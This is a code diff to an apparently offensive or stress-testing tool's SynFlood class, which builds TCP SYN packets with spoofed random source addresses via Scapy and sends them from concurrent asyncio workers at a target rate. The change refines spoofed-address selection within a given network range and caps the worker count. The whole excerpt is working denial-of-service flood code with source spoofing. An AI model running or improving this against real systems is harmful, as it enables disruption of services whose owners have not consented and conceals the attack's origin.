@@ -34,9 +34,12 @@ class SynFlood(AttackEngine):
                     src = str(ipaddress.IPv4Address(random.randint(1, 2**32 - 2)))
                 else:
                     network = ipaddress.ip_network(self.syn.spoof_src, strict=False)
-                    # Include the network address for /31 and /32 ranges.
-                    addresses = tuple(network.hosts()) or (network.network_address,)
-                    src = str(random.choice(addresses))
+                    first = int(network.network_address)
+                    last = int(network.broadcast_address)
+                    if network.prefixlen < 31:
+                        first += 1
+                        last -= 1
+                    src = str(ipaddress.IPv4Address(random.randint(first, last)))
                 kwargs["src"] = src
             return IP(**kwargs) / TCP(sport=random.randint(1024, 65535), dport=self.port, flags="S")
 
@@ -45,6 +48,7 @@ class SynFlood(AttackEngine):
 
         loop = asyncio.get_running_loop()
         per_worker = max(self.target_rps // self.workers, 1)
+        worker_count = min(self.workers, self.target_rps)
 
         async def worker() -> None:
             while True:
@@ -53,7 +57,7 @@ class SynFlood(AttackEngine):
                 self.stats["sent"] += per_worker
                 self.stats["ok"] += per_worker  # fire-and-forget; no ACK tracking in MVP
 
-        workers = [asyncio.create_task(worker()) for _ in range(self.workers)]
+        workers = [asyncio.create_task(worker()) for _ in range(worker_count)]
         await asyncio.sleep(self.duration_sec)
         for w in workers:
             w.cancel()
